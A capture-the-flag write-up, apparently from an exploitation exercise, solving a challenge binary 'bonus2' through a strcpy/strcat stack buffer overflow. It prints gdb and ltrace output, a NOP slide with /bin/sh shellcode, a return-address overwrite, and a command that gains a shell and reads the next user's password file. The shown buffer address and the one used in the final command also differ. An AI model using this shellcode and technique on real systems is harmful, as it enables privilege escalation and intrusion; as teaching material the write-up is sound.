# Bonus 2

## Initial Context

- One file: `bonus2`

## Solving the Challenge

The program expects two parameters, but will store it in one continuous buffer.
Depending on the `LANG` environment variable, the program will great in a different language.

Since the code contains `strcpy` and `strcat`, its likely a buffer overflow exploit.

We can start by finding EIP's offset.
Unfortunately even though the default language crashes the program, EIP is not found.
But by testing with `LANG=fi`, we can find EIP's offset.

```bash
$ gdb ./bonus2
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3

Program received signal SIGSEGV, Segmentation fault.
0x63413962 in ?? ()
```

The pattern returns an offset of `58`.

Since we have to input two parameters, we can subtract the length of the first one. Now the offset is at `58 - 40 = 18`.

We can put a simple shell code in the first argument and redirect via the second one.

First we have to find the address of the buffer:

```bash
$ ltrace ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 32')
...
strncpy(0xbffff6b0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 40) = 0xbffff6b0
...
```

Now we can craft the first payload:

```python
# NOP slide
"\x90" * (40 - 24)

# shell code
+ "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
```

And the second payload:

```python
# padding of 18
"A" * 18

# `buffer`'s address in LE
+ "\xb0\xf6\xff\xbf"
```

We can send it to the vulnerable program:

```bash
$ export LANG=fi
$ ./bonus2 $(python -c 'print "\x90" * (40 - 24) + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') $(python -c 'print "A" * 18 + "\xc0\xf6\xff\xbf"')
Hyvää päivää ����������������1�Ph//shh/bin��PS�ᙰ
                                                ̀AAAAAAAAAAAAAAAAAA����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
<flag>
```
